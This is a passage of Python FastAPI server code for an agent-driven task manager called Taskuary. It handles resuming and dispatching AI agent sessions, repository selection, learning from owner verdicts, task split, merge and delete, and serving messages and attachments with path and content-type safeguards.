    store.audit('task', task_id, 'continue-session', ACTOR, detail={'agent': row['Agent'], 'fromSid': row['Sid']})
    from . import outcomes                           # the ledger: the owner's next move after a stop, in their words
    outcomes.record(store, 'agent.continued', 'task', task_id, ACTOR, next_move=(body.instruction if body else None) or '', facts={'door': 'continue-session'})
    return {'resumed': row['ExtId'], 'agent': row['Agent'], 'fromSession': row['Sid'], 'session': session}


class ContinueBody(BaseModel):
    note: str | None = None          # what to tell it as it picks up - optional
    images: list[str] = []           # pictures to go with it (/api/prompt-image)


@app.post('/api/tasks/{task_id}/continue-work')
def continue_work(task_id: int, body: ContinueBody = None):
    """CONTINUE SESSION - one road for every agent (A19, the owner, 2026-09-25: "should work for both coding and non coding
    agents? Maybe add a new prompt inside that continue session"). A regular agent resumes its saved conversation; a
    coding agent reopens its own CLI session by the id its CLI gave it, or - where there is none to reopen - a fresh
    one seeded with the handover. The owner's note, when there is one, is the first thing it hears."""
    from . import asks
    asks.mark(store, task_id)          # the owner picked it up again: it reports back like an ask
    from . import continuity, general
    task = store.get_task(task_id)
    if not task: raise HTTPException(404, 'task not found')
    if task.get('Status') == 'dropped': raise HTTPException(409, 'This task was dismissed.')
    note = ' '.join(str((body.note if body else '') or '').split())[:4000]
    imgs = prompt_images(body.images if body else [])
    if general.handles(task):
        # THE THREAD MOVED AFTER ITS LAST TURN: the mail that reopened the task goes in first, in the turn's instructions - "pick up
        # where work stopped" alone woke the assistant at "reply sent, task closed" while two people had since asked for more (2026-10-14)
        news = continuity.news_block(store, task_id)
        if not general.provider_options(store): raise HTTPException(422, f"Connect an AI under {words.name('ai')} to continue this work.")
        if task.get('Status') not in ('open', 'waiting', 'in_progress'): store.update_task(task_id, {'Status': 'in_progress'}, ACTOR)
        def go():
            try: general.start_session(store, task_id, actor=ACTOR).send_prompt(note or continuity.RESUME_PROMPT, imgs or None, as_owner=bool(note or imgs), echo=bool(note),
                                                                              delivery_instructions=news or None)
            except Exception as e: _walk_cannot(task_id, f'The session could not continue: {e}. Your saved conversation is still here.')
        threading.Thread(target=go, daemon=True, name=f'continue-{task_id}').start()
        store.audit('task', task_id, 'continue-work', ACTOR, detail={'kind': 'general', 'note': bool(note)})
        from . import outcomes
        outcomes.record(store, 'agent.continued', 'task', task_id, ACTOR, next_move=note or '', facts={'door': 'continue-work', 'kind': 'general'})
        return {'continued': True, 'taskId': task_id, 'kind': 'general'}
    note = with_images(note, imgs).strip()
    row, _why = _resumable(task_id)
    # CONTINUE IS THE SAME CLI (the owner, 2026-09-30: "it should start as codex if i hit continue of course"): the one that made
    # the conversation, else the one that last worked the task - never whatever the default happens to be today
    last = row or store.last_transcript(task_id) or {}
    brain = (last.get('Brain') or None) if isinstance(last, dict) else None
    # ...and a reply the owner has since SENT is said too: a fresh session told nothing drafted it again (2026-10-20)
    sent = continuity.sent_block(store, task_id, quote=0, cmd='`taskuary --follow-up --reply "<text>"`')
    fresh = lambda: continue_task(task_id, CodeBody(brain=brain, instruction=(f'FROM THE OWNER: {note}\n\n' if note else '') + continuity.RESUME_PROMPT
                                                                       + (f'\n\n{sent}' if sent else '')))   # their words lead
    if row:
        # the conversation belongs to the CLI that made it; when THAT CLI cannot open now (out of sessions, signed out), a fresh
        # session seeded with the handover is the way on - not an error (the owner, 2026-09-30, TQ-0887: codex made it, codex was
        # unavailable, and every Continue failed)
        # a CODING agent is told of the new mail by terminal.resume_seed - a count and the context file that holds it whole. The
        # mail itself must not ride the instruction: it was labelled the owner's words, clipped at the tty's ~1 KB command line,
        # and left sitting unsent on the prompt (the owner, 2026-10-14)
        try: out = continue_session(task_id, CodeBody(instruction=note or None))
        except HTTPException as e:
            if e.status_code != 422: raise
            store.add_comment(task_id, 'router', 'agent', f"{brain or row['Agent']} could not reopen its conversation ({e.detail}); "
                                                          f"starting a fresh {brain or 'agent'} session with the handover instead.")
            row, out = None, fresh()
    else: out = fresh()
    store.audit('task', task_id, 'continue-work', ACTOR, detail={'kind': 'coding', 'resumed': bool(row), 'note': bool(note)})
    if not row:                                      # a resumed one was recorded by continue_session itself: one act, one row
        from . import outcomes
        outcomes.record(store, 'agent.continued', 'task', task_id, ACTOR, next_move=note or '', facts={'door': 'continue-work', 'kind': 'coding'})
    return {'continued': True, 'taskId': task_id, 'kind': 'coding', 'resumed': bool(row), **(out if isinstance(out, dict) else {})}


@app.post('/api/tasks/{task_id}/comments')
def comment(task_id: int, body: TextBody):
    store.add_comment(task_id, ACTOR, 'human', body.body)
    return {'ok': True}


@app.get('/api/assistant/previous-work')
def previous_work():
    from . import continuity
    return {'data': continuity.previous_work(store)}


_RESUME_LOCK = threading.Lock()


def _resume_assistant(task_id):
    from . import continuity, general
    try:
        news = continuity.news_block(store, task_id)     # the mail since, or that its reply already went (2026-10-20)
        general.start_session(store, task_id, actor=ACTOR).send_prompt(
            continuity.RESUME_PROMPT, as_owner=False, echo=False, **({'delivery_instructions': news} if news else {}))
    except Exception as e:
        _walk_cannot(task_id, f'The session could not resume: {e}. Your saved conversation is still here.')
    finally:
        general.OPENING.discard(task_id)


@app.post('/api/tasks/{task_id}/resume')
def resume_previous_work(task_id: int, background: BackgroundTasks):
    from . import continuity, general
    with _RESUME_LOCK:
        task = store.get_task(task_id)
        if not task: raise HTTPException(404, 'task not found')
        if task.get('Status') == 'dropped': raise HTTPException(409, 'This task was dismissed.')
        review = store.pending_review(task_id)
        if review: return {'action': 'review', 'reviewId': review['ReviewId'], 'taskId': task_id}
        # A finished task is not a closed conversation. The agent's own session is still there to
        # pick up - and picking it up means there is live work again, so the task comes back to the
        # work tab rather than running invisibly behind a done row (the owner, 2026-09-15).
        reopened = task.get('Status') not in ('open', 'waiting', 'in_progress')
        if task_id in general.OPENING or any(s.task_id == task_id and s.alive for s in list(hub_term.SESSIONS.values())):
            return {'action': 'open', 'taskId': task_id}
        if general.handles(task) and not general.provider_options(store):
            raise HTTPException(422, f"Connect an AI under {words.name('ai')} to resume this work.")
        if reopened: store.update_task(task_id, {'Status': 'in_progress'}, ACTOR)
        general.OPENING.add(task_id)
    if general.handles(task):
        background.add_task(_resume_assistant, task_id)
    else:
        sent = continuity.sent_block(store, task_id, quote=0, cmd='`taskuary --follow-up --reply "<text>"`')
        try: continue_task(task_id, CodeBody(instruction=continuity.RESUME_PROMPT + (f'\n\n{sent}' if sent else '')))
        finally: general.OPENING.discard(task_id)
    return {'action': 'open', 'taskId': task_id}

NEEDS_REPO = re.compile(r'could not tell which checkout|no local path|does not exist|choose one', re.I)


def _pressed_on(task_id: int, body) -> int:
    """The task the press was made on: the goal a step was started from (DispatchBody.via, only the step's own parent), else the task."""
    via = getattr(body, 'via', None)
    return int(via) if via and (store.get_task(task_id) or {}).get('ParentId') == int(via) else task_id

def _start_failed(task_id: int, e):
    """A START THAT FAILED IS LEFT ON THE TASK, where the Advisor reads what failed: said only in the answer, the line over it still
    advised the move from before the press, as if the agent had started (the advisor matrix, 2026-10-19)."""
    from . import failures
    try: failures.record(store, task_id=task_id, kind='dispatch.prepare', error=e, what='the agent did not start')
    except Exception as x: logger.debug(f'task {task_id}: the failed start was not kept - {x}')

def _start_went(task_id: int):
    """...and A START THAT WENT clears it: the failure is the newest act on the task, so the Advisor kept saying the agent did not start
    over one that had, once pressed again (the matrix's verify, 2026-10-20). Written only over a failed start, so nothing else moves."""
    last = (store.operations_for(task_id) or [{}])[-1]
    if last.get('Kind') == 'dispatch.prepare' and last.get('Status') == 'error':
        import uuid
        store.add_operation({'OpId': uuid.uuid4().hex[:12], 'Kind': 'dispatch.prepare', 'TargetKind': 'task', 'TargetId': int(task_id), 'ParamsJson': '{}',
                             'Version': 1, 'Status': 'done', 'OutcomeJson': json.dumps({'what': 'the agent started'})})

@app.post('/api/tasks/{task_id}/dispatch')
def dispatch_task(task_id: int, body: DispatchBody, background: BackgroundTasks):
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    from . import asks
    asks.mark(store, task_id)          # the owner started it - the button or the assistant: it reports back like an ask
    try:
        out = _dispatch_task_to_its_agent(task_id, body, background)
        if isinstance(out, dict) and (out.get('started') or out.get('existing')): _start_went(_pressed_on(task_id, body))
        if isinstance(out, dict) and body.said:
            from . import concierge
            said = concierge.said_started(store, body.said, out)
            if said: out = {**out, 'said': said}
        return out
    except HTTPException as e:
        # a repository the agent cannot open - none chosen, several plausible, a path that is gone - is a
        # DECISION for the owner, shown as a visible choice, never a session in some other checkout (PW-095)
        if e.status_code == 422 and NEEDS_REPO.search(str(e.detail or '')):
            from . import funnel; funnel.hold_for_repo(store, task_id, str(e.detail or ''))    # ...and the task keeps saying so after the answer is gone
            return {'dispatch': 'needs_repo', 'started': False, 'existing': False, 'agent': body.agent or hub_agents.default_agent(store), 'taskId': task_id,
                    'ref': task_ref(task_id), 'reason': str(e.detail or '')}
        if e.status_code >= 422: _start_failed(_pressed_on(task_id, body), str(e.detail or 'the agent did not start'))
        raise
    except Exception as e:
        # A START THAT FAILED is said once, with its fix (failures.classify): a missing coding tool answered 500 with the raw
        # "FileNotFoundError: [Errno 2] ... 'claude'" on the task page, and nothing to press (the dead-end walk, 2026-10-18)
        from . import failures
        logger.warning(f'dispatch of task {task_id} failed: {e}')
        c = failures.classify(e, act='dispatch.prepare')
        _start_failed(_pressed_on(task_id, body), e)
        return JSONResponse(status_code=422, content={'detail': c['sentence'], 'fix': c['fix'], 'retry': c['retry']})

class RepoBody(BaseModel):
    repo: str | None = None          # None clears the tag and lets Taskuary guess again
    path: str | None = None          # set the agent's local path for it, if it has none
    agent: str = ''                  # blank: the coding profile (agents.coding_role)
    restart: bool = False            # close the session that is in the wrong tree and reopen here

def _profile(agent: str = '') -> str:
    """The profile whose checkouts a repo picker reads: the one named, else the coding profile by its kind. A name that is
    gone - a page still sending an old profile name - reads the coding profile too, not an empty map."""
    return agent if agent and store.get_agent(agent) else hub_agents.coding_role(store)

def _repo_rows(task_id: int, agent: str = ''):
    """Every repo Taskuary knows, ranked for this task, with whether the agent can open it. A repo
    in SOUL.md with no local path is listed and flagged, not hidden - "we know what it is but not
    where it is" is the thing the owner has to fix, and it cannot be fixed invisibly."""
    row = store.get_agent(_profile(agent)) or {}
    prof = json.loads(row.get('Config') or '{}')
    paths, desc = (prof.get('cwd_map') or {}), hub_term.repo_map(store)
    tagged = (re.search(r'repo:([^\s,]+)', str((store.get_task(task_id) or {}).get('Tags') or '')) or [None, None])[1]
    return [{'repo': r, 'score': sc, 'what': desc.get(r, ''), 'path': paths.get(r),
             'has_path': has, 'tagged': r == tagged,
             # a pathless repo is searched for on the spot, so the picker can offer the answer
             'found': None if has else hub_term.find_checkout(r, prof, seconds=1.5)}
            for r, sc, has in hub_term.rank_repos(store, task_id, prof)]

@app.get('/api/tasks/{task_id}/repos')
def task_repos(task_id: int, agent: str = ''):
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    picked, why = hub_term.guess_repo(store, task_id, json.loads((store.get_agent(_profile(agent)) or {}).get('Config') or '{}'))
    return {'data': _repo_rows(task_id, agent), 'picked': picked, 'why': why}

@app.get('/api/repos')
def list_repos(agent: str = ''):
    """Every repo Taskuary knows, for a task that does not exist yet (the New card's picker). Alphabetical - there is no
    ask to rank against - and the flag the task-bound list carries: a repo with no local folder is listed, not hidden."""
    prof = json.loads((store.get_agent(_profile(agent)) or {}).get('Config') or '{}')
    paths, desc = (prof.get('cwd_map') or {}), hub_term.repo_map(store)
    return {'data': [{'repo': r, 'what': desc.get(r, ''), 'path': paths.get(r), 'has_path': bool(paths.get(r))}
                     for r in sorted(dict.fromkeys(list(desc) + list(paths)), key=str.lower)]}

@app.put('/api/tasks/{task_id}/repo')
def set_task_repo(task_id: int, body: RepoBody, background: BackgroundTasks = None):
    """Put this task in the right checkout. The `repo:` tag is the override that always wins over
    the guess, so this is also how you correct one - and because a running session is already in
    the wrong tree, `restart` closes it and opens a fresh one whose prompt names the new repo."""
    t = store.get_task(task_id)
    if not t: raise HTTPException(404, 'task not found')
    # Replacing a choice replaces what that task taught. Otherwise correcting repo A to repo B
    # would leave the same task as positive evidence for both projects forever.
    store.clear_project_evidence(task_id)
    tags = [x for x in re.split(r'[\s,]+', str(t.get('Tags') or '')) if x and not x.startswith('repo:')]
    if body.repo: tags.append(f'repo:{body.repo}')
    if body.repo: tags = [x for x in tags if x != 'held:repo']    # the question a held start asked (funnel.HELD_REPO) is answered
    store.update_task(task_id, {'Tags': ' '.join(tags)}, ACTOR)
    # a repo Taskuary knows about but has no path for cannot be opened - take the path here
    if body.repo and body.path:
        body.agent = _profile(body.agent)
        row = store.get_agent(body.agent)
        if not row: raise HTTPException(422, f'unknown agent: {body.agent}' if body.agent else 'no coding profile is set up to hold that path')
        if not Path(body.path).is_dir(): raise HTTPException(422, f'not a directory: {body.path}')
        prof = copy.deepcopy(cfg.get('agents', {}).get(body.agent) or json.loads(row.get('Config') or '{}'))
        prof.setdefault('cwd_map', {})[body.repo] = body.path
        cfg.setdefault('agents', {})[body.agent] = prof
        config.save(cfg)
        cli_connections.sync(cfg, store, body.agent)
    store.add_comment(task_id, ACTOR, 'human',
                      'Marked general - no repository. The session opens in the agent\'s own folder '
                      'and the prompt says there is no codebase to change.' if body.repo == hub_term.NO_REPO
                      else f'Repo set to {body.repo} - the session works there and the prompt says so.'
                      if body.repo else 'Cleared the repo - Taskuary picks it from the ask again.')
    store.audit('task', task_id, 'set_repo', ACTOR, detail={'repo': body.repo, 'path': body.path})
    if body.repo and body.repo != hub_term.NO_REPO:
        from .projects import learn_task_repository
        from . import routingmemory as rmem
        learn_task_repository(store, task_id, body.repo, ACTOR)
        # the project graph already weighted this choice; what it never did was tell the PROFILE.
        # "triage chose ledger and the owner moved the work to portal" is a pattern worth generalising,
        # and it reached LEARNED.md as nothing at all.
        if background is not None and str(t.get('Tags') or '').find(f'repo:{body.repo}') < 0:
            try: background.add_task(learn.learn_from, store, rmem.lesson(store, task_id, 'repository', body.repo))
            except Exception as e: logger.debug(f'repo lesson skipped: {e}')
    from .docsync import sync_projects
    sync_projects(store, ACTOR)
    out = {'ok': True, 'repo': body.repo}
    if body.restart:
        live = hub_term.session_for(task_id)
        if live: hub_term.close(live.sid)
        out['session'] = start_session(store, task_id, body.agent, brain=getattr(body, 'brain', None))
    return out

class NotATaskBody(BaseModel):
    learn: bool = True
    # "archive it": off the pipe and closed, never deleted - the chat's own verb, and what
    # filing does anyway to a task an agent has worked (work_on_task)
    archive: bool = False
    # ...and the half the verdict never carried: WHERE it actually belongs. "Not for the agent"
    # says where the work does not go; only this says where it does, and the routing table had
    # no way to hold a system that is not a git repository at all (TQ-0501: clocking in is ADP).
    belongs_to: str | None = None

def _teach_not_a_task(m: dict, background=None):
    """The NOT A TASK verdict, written the SAME way whichever door it came through - the task
    list's "Not a task" and the timeline's "Not a task - just conversation" are one judgement
    and used to teach two different things (owner, 2026-08-30).

    It writes a memory note and NOTHING else. It used to also save a sender `ignore` POLICY,
    which quietly muted that address for good - a second, wider verdict the owner never asked
    for, hidden inside a button whose label says "not a task". Silencing a sender has its own
    button and always did ("Skip this sender"), where it is undoable and says what it does.

    Keyed on the topic where there is one and on the sender otherwise. With neither - a Teams
    chat has no address, and a two-word subject has no topic - there is nothing to key a note
    to, and a note keyed to nothing is a verdict against everyone, so none is written. The
    thread is still ruled either way: that is the ignore route the callers add."""
    em, topic = (m.get('FromEmail') or '').lower(), _topic_key(m)
    if not (em or topic): return None
    mid = store.add_memory({'Scope': 'subject' if topic else 'sender', 'ScopeKey': topic or em,
                            'Source': 'verdict', 'Active': 1, 'CreatedBy': ACTOR,
                            'Note': f"{str(m.get('SentAt') or '')[:10]}: \"{(m.get('Subject') or '')[:90]}\""
                                    + (f' from {em}' if em else '') + (f' - the topic "{topic}"' if topic else '')
                                    + ' - NOT A TASK: the owner filed it, no task, no reply'})
    learn.note_verdicts(store)
    # the sender note is durable already; the GENERAL lesson (what kinds of mail are not tasks
    # for this owner) is LEARNED.md's to distill
    if background is not None:
        background.add_task(learn.learn_from, store,
                            f"mem{mid}: owner said NOT A TASK: \"{(m.get('Subject') or '')[:80]}\""
                            + (f' from {em}' if em else '') + ' should never have opened a task')
    return mid

@app.post('/api/tasks/{task_id}/not-coding')
def not_coding(task_id: int, body: NotATaskBody = None, background: BackgroundTasks = None):
    """Owner verdict: real work, but not for the coding agent. The default is the other way
    round on purpose - everything that is work goes to the agent, which says "nothing to do
    here" when there is nothing - so this button is how the exceptions get taught: the task
    stays, on the owner's list, its live session (if any) is closed, and an evidence line says
    so for the next message like it."""
    t = store.get_task(task_id)
    if not t: raise HTTPException(404, 'task not found')
    live = hub_term.session_for(task_id)
    if live and live.alive: hub_term.close(live.sid)
    was = operations.verdict_of_task(store, task_id)
    store.update_task(task_id, {'Kind': 'task'}, ACTOR)
    store.clear_dispatch(task_id)
    belongs = (body.belongs_to if body else None)
    taught = _teach_not_coding(task_id, t, was, belongs, body is None or body.learn, background)
    store.add_comment(task_id, ACTOR, 'human', 'Not a coding task - kept on your list; the agent is off it.'
                      + (f" It belongs to {belongs.strip()}." if (belongs or '').strip() else ''))
    store.audit('task', task_id, 'not_coding', ACTOR, detail=dict(taught))
    return {'ok': True, 'kind': 'task', **taught}


def _teach_not_coding(task_id: int, t: dict, was: tuple, belongs_to: str = None,
                      learn_it: bool = True, background=None) -> dict:
    """The NOT-FOR-THE-AGENT verdict, written the SAME way whichever control gave it.

    There are two controls for one judgement - the button on the task and the kind selector beside
    it - and they used to teach different things: the button wrote the evidence line, the learned
    profile and the overturned-verdict record, while the selector, which is the one most people
    reach for, wrote the field and nothing else (TQ-0501, the owner: "i updated the type to 'your
    task'... does that trigger memory?" - it did not). Four writes, one of them new:

    - the OVERTURNED VERDICT, so what triage said and what the owner made of it stay joined;
    - an EVIDENCE LINE in the memory table, which ingest.notes_for puts in front of triage on the
      next message about this sender or topic;
    - the general lesson, distilled into LEARNED.md by the hot pass (learn.learn_from);
    - the ROUTING FACT, weighted and task-keyed (routingmemory) - and, when the owner typed one,
      WHERE the work actually lives, which is the half no verdict has ever carried.
    """
    was_kind, was_route = was if was else (None, None)
    operations.record_direct(store, 'task.set_kind', task_id, {'kind': 'task'}, ACTOR, {'kind': 'task'},
                             verdict=was_kind, route_id=was_route)
    msgs = store.list_messages(task_id)
    learned = None
    if msgs and learn_it:
        m = msgs[0]; em = (m.get('FromEmail') or '').lower(); topic = _topic_key(m)
        said = (m.get('Subject') or t.get('Title') or '')[:90]
        learned = store.add_memory({'Scope': 'subject' if topic else 'sender' if em else 'global', 'ScopeKey': topic or em or None,
                                    'Source': 'verdict', 'Active': 1, 'CreatedBy': ACTOR,
                                    'Note': f"{str(m.get('SentAt') or '')[:10]}: \"{said}\""
                                            + (f' from {em}' if em else '') + (f' - the topic "{topic}"' if topic else '')
                                            + ' - NOT A CODING TASK: real work, kept on the owner\'s list, no agent'
                                            + (f' - it belongs to {belongs_to.strip()}' if (belongs_to or '').strip() else '')})
        learn.note_verdicts(store)
    # the general lesson is _teach_routing's to write, once, in words that name what triage had
    # actually answered - this used to write its own vaguer copy alongside it. The memory id rides
    # as the evidence key so LEARNED.md's `ev:` tag points at the line the owner can actually read.
    return {'memoryId': learned,
            **_teach_routing(task_id, 'kind', 'task', belongs_to=belongs_to, background=background,
                             ev=f'mem{learned}' if learned else None)}


def _reclassify(task_id: int, want: str, background=None) -> None:
    """Move an EXISTING task to a kind the owner just chose, down the task page's own road.

    Four controls reclassify a task and each used to do it its own way: the kind selector (the
    PATCH), the button, a timeline card's operation, and the assistant's "put it on my list" /
    "talk this one through". The last three wrote `Kind` straight to the column - so they taught
    neither memory, and left any live session attached to a task that had changed worker mode.
    One road, so a judgement is worth the same wherever it is given.
    """
    t = store.get_task(task_id) or {}
    if not t or t.get('Kind') == want or t.get('Status') in ('done', 'dropped'): return
    update_task(task_id, TaskBody(Kind=want), background)


def _teach_routing(task_id: int, field: str, value: str, belongs_to: str = None,
                   background=None, ev: str = None) -> dict:
    """One correction to a triage verdict, learned wherever it came from.

    Every door that overturns a routing field lands here - the task page's button, the kind
    control, the assistant's "put it on my list" - because the SAME judgement taught different
    things depending on which one you used, and the one most people reach for (the kind control)
    taught nothing at all.

    It writes to BOTH memories, which answer different questions. The routing fact
    (routingmemory) is the precise one: this sender, this field, this value, weighted by how many
    times it has held - what the next verdict is shown. The LEARNED.md line is the general one,
    distilled by the hot pass into a pattern about how the owner works. Only the first existed
    for anything but `kind`, so a reassigned worker or a rerouted repository taught the profile
    nothing whatever.

    A failure to learn never fails the correction: the owner's change to their own task lands
    whatever either memory does.
    """
    from . import routingmemory as rmem
    out = {}
    for f, v in (('system', (belongs_to or '').strip()), (field, value)):
        if not v: continue
        try:
            said = rmem.lesson(store, task_id, f, v, belongs_to if f != 'system' else None, ev)
            n = rmem.learn_correction(store, task_id, f, v, ACTOR, reason=said[:200])
            if n: out[f'learned_{f}'] = n
            # the general lesson, once per correction and only when it taught something new -
            # a re-press of the same button must not spend an AI call restating a known pattern
            if n and background is not None: background.add_task(learn.learn_from, store, said)
        except Exception as e:
            logger.warning(f'routing memory: {f}={v} on task {task_id} not learned - {e}')
    return out

@app.post('/api/tasks/{task_id}/not-a-task')
def not_a_task(task_id: int, body: NotATaskBody = None, background: BackgroundTasks = None):
    """Owner verdict: never needed to be a task. Writes the verdict to memory (_teach_not_a_task
    - a note, never a policy: muting a sender is "Skip this sender", not a side effect of this),
    then deletes the task - its messages stay in the feed as 'filed'.

    learn=false is the lighter verdict: THIS one is just chatter (someone answered "yes"), with
    nothing to conclude - delete the task and teach nothing."""
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    from . import recentlydeleted
    snap = recentlydeleted.task_snapshot(store, task_id)          # ...kept for the Undo line, verdict marks and all
    msgs, learned = store.list_messages(task_id), None
    was_kind, was_route = operations.verdict_of_task(store, task_id)
    operations.record_direct(store, 'task.not_a_task', task_id, {}, ACTOR, {'deleted': True}, verdict=was_kind, route_id=was_route)
    if msgs and (body is None or body.learn):
        mid = _teach_not_a_task(msgs[0], background)
        if mid: learned = {'memory_id': mid}
    # whatever was (or was not) learned about the sender, THIS conversation has been ruled on:
    # the owner's ignore route is what ingest.veto reads before the next message on it can open
    # a task (store.owner_verdict_on_thread) - the six-tasks-from-one-chat failure
    if msgs:
        snap['ignore'] = store.add_route(msgs[0]['MessageId'], None, 'ignore', None,
                                         f"not a task - {(msgs[0].get('Subject') or 'this conversation')[:80]}", [], ACTOR)
    if learned: snap['memory'] = learned['memory_id']
    kept = recentlydeleted.keep_task(store, snap)
    store.audit('task', task_id, 'not_a_task_delete', ACTOR)
    _drop_task(task_id)
    return {'ok': True, 'learned': learned, **kept}

class SplitHalf(BaseModel): title: str | None = None; summary: str | None = None
class TaskSplitBody(BaseModel):
    second: SplitHalf
    first: SplitHalf | None = None
    move_message_ids: list[int] = []
class MergeBody(BaseModel): into: int

@app.get('/api/tasks/{task_id}/split/suggest')
def split_suggest(task_id: int):
    """What are the two jobs in here? A proposal only - nothing is created until the owner
    confirms, and with no AI brain connected the second job is left empty for the owner to name."""
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    return reshape.propose_split(store, task_id, _llm())

@app.post('/api/tasks/{task_id}/split')
def split_task_api(task_id: int, body: TaskSplitBody):
    """Triage filed two jobs as one. This task keeps its ref, session and report; the second
    job becomes a new task, with the messages you ticked."""
    try:
        new = reshape.split_task(store, task_id, body.second.model_dump(),
                                 body.first.model_dump() if body.first else None, body.move_message_ids, ACTOR)
    except ValueError as e:
        raise HTTPException(404 if 'no task' in str(e) else 422, str(e))
    return {'taskId': new, 'ref': task_ref(new)}

@app.get('/api/tasks/{task_id}/merge-candidates')
def merge_candidates_api(task_id: int):
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    return {'data': reshape.merge_candidates(store, task_id)}

@app.post('/api/tasks/{task_id}/merge')
def merge_task_api(task_id: int, body: MergeBody):
    """Fold this task into `into` - the same job, filed twice. This one is dropped with a
    pointer at the survivor; a task with a live session cannot be folded away underneath it."""
    if hub_term.for_task(task_id):     # for_task only ever returns a LIVE session
        raise HTTPException(422, f'{task_ref(task_id)} has a session running - close or pause it first')
    try:
        return reshape.merge_tasks(store, task_id, body.into, ACTOR)
    except ValueError as e:
        raise HTTPException(404 if 'no task' in str(e) else 422, str(e))

@app.post('/api/tasks/purge-dropped')
def purge_dropped():
    victims = [t['TaskId'] for t in store.list_tasks('dropped')]
    for tid in victims:
        store.audit('task', tid, 'purge_dropped', ACTOR)
        _drop_task(tid)
    return {'ok': True, 'deleted': len(victims)}

def work_on_task(tid: int) -> str:
    """What deleting this task would DESTROY, in words - '' when there is nothing to lose. An agent
    on it, a report it wrote, a commit it made: none of that can be recovered, and one sentence in
    the chat used to be enough to lose all three (the 2026-09-03 break test: "not ours" about the
    Teams outage deleted TQ-0002, its agent report and its drafted reply)."""
    if not store.get_task(tid): return ''
    had = []
    try:
        # live_sessions is the same truth the pipe reads for "an agent has this one" - for_task alone
        # misses a session the watcher knows about
        live = hub_term.for_task(tid) or next((x for x in hub_term.live_sessions() if x.get('taskId') == tid), None)
        if live: had.append('an agent is working it')
    except Exception: pass
    # A written reply waiting for a yes is work too, and nothing else records it: the drafter leaves no
    # comment, so a reply-only task answered "not ours" was hard-deleted with the draft inside it
    # (2026-09-10 audit). An EMPTY pending review is only a question nobody answered - still deletable.
    rv = store.pending_review(tid)
    if rv and str(rv.get('DraftText') or '').strip(): had.append('it carries a reply waiting to be sent')
    cs = store.list_comments(tid)
    if any(str(c.get('Body') or '').startswith((*REPORTS, 'HANDOVER NOTE')) for c in cs): had.append('it carries an agent report')
    # the router's own bookkeeping ('not auto-started', 'start failed', 'queued') is not an agent's work: a task
    # nothing ever ran on stays deletable however loudly the pipeline explained why (PW-073)
    if any(str(c.get('ActorType') or '') == 'agent' and str(c.get('Actor') or '') != 'router' for c in cs) and 'it carries an agent report' not in had:
        had.append('an agent has worked on it')
    return ' and '.join(had)


def _file_task(tid: int, why: str) -> str:
    """The task behind a filed message: DELETED when nothing was ever done on it, ARCHIVED (closed,
    with the reason on it) when an agent touched it. Returns 'deleted' or 'archived'."""
    lost = work_on_task(tid)
    if not lost:
        _drop_task(tid); return 'deleted'
    from . import concierge
    concierge.close_task(store, tid, ACTOR)                     # the work is kept; Mark done stops the agent
    store.add_comment(tid, ACTOR, 'human', f'Archived, not deleted - {why}. Kept because {lost}.')
    store.audit('task', tid, 'archived_not_deleted', ACTOR, detail={'why': why, 'kept': lost})
    return 'archived'


def _drop_task(tid: int):
    """Deleting a task must also stop the agent working it. "Not a task" read as a kill - it
    was not: the pty kept running, kept editing files, and kept holding the task id, so when
    SQLite handed that id to the NEXT task the orphan showed up as the agent working it. A
    task that no longer exists has nobody working it, by definition."""
    try:
        live = hub_term.for_task(tid)
        if live:
            hub_term.close(live['sid'])
            logger.info(f'closed the session on task {tid} - the task was deleted')
    except Exception as e:
        logger.warning(f'could not close the session on deleted task {tid}: {e}')
    store.delete_task(tid)

def _readable(m: dict) -> dict:
    """A message with its ReadText beside the body as stored (triage.read_text) - what every screen shows."""
    from .triage import read_text
    try: return m | {'ReadText': read_text(m.get('BodyText') or '', m.get('OwnText'))} if m else m
    except Exception: return m


@app.get('/api/messages/{mid}')
def get_message(mid: int):
    """One message, whole body - the timeline row only carries a 4000-char preview."""
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    return _readable(m)

def _att_row(a: dict) -> dict:
    """One attachment as the panel needs it: enough to decide whether to draw it or list it."""
    return {'id': a['AttachmentId'], 'name': a['Name'], 'content_type': a['ContentType'] or '',
            'size': a['Size'], 'inline': bool(a['Inline']), 'saved': bool(a['Path']),
            'is_image': str(a['ContentType'] or '').startswith('image/'),
            # a voice note is meant to be PLAYED where you are reading it, not downloaded and
            # opened in something else - the panel draws a player for these (Attachments.jsx)
            'is_audio': str(a['ContentType'] or '').startswith('audio/'),
            'url': f"/api/attachments/{a['AttachmentId']}" if a['Path'] else None}


def _artifact_row(a: dict) -> dict:
    return {'id': a['ArtifactId'], 'name': a.get('Name') or 'session artifact.md',
            'content_type': a.get('ContentType') or 'text/markdown', 'size': a.get('Size') or 0,
            'kind': a.get('Kind') or 'session', 'created_by': a.get('CreatedBy') or '',
            'created_at': a.get('CreatedAt'),
            'url': f"/api/task-artifacts/{a['ArtifactId']}" if a.get('Path') else None,
            # a page a Claude session published: its claude.ai link (claude_artifacts); `url` is the local copy
            **({'external_url': a['Url'], 'version': a.get('Version') or ''} if a.get('Url') else {})}

# SVG/HTML as a navigable document on this origin runs script as Taskuary. PNG/JPEG
# stay `inline` so the panel <img> can draw them; SVG still displays in <img> with
# Content-Disposition: attachment (the tab-open case is what this blocks).
_NOSCRIPT = ('image/svg+xml', 'image/svg', 'text/html', 'application/xhtml+xml',
             'text/xml', 'application/xml', 'text/javascript', 'application/javascript')

def _attachment_path(raw: str):
    """The file on disk, if it is really one of ours. A Path column pointing outside
    ~/.taskuary/attachments would turn GET /api/attachments/:id into a local file read."""
    if not raw: return None
    # resolve() is INSIDE the try: a malformed stored path (embedded NUL, illegal chars)
    # raises right there, and that used to be a 500 where the honest answer is 404
    try:
        p, root = Path(raw).resolve(), (config.home() / 'attachments').resolve()
        if not p.is_relative_to(root) or not p.is_file(): return None
    except (OSError, ValueError):
        return None
    return p

def _att_filename(name: str) -> str:
    """Content-Disposition cannot carry CR/LF or a path - take the first line, then
    the basename. Mail names are mostly cleaned on save; this is the last gate."""
    n = Path((str(name or 'attachment').splitlines() or ['attachment'])[0]).name[:120]
    return n or 'attachment'

@app.get('/api/messages/{mid}/thread')
def message_thread(mid: int, limit: int = 40):
    """Everything said on this conversation, oldest last - INCLUDING the owner's own replies.

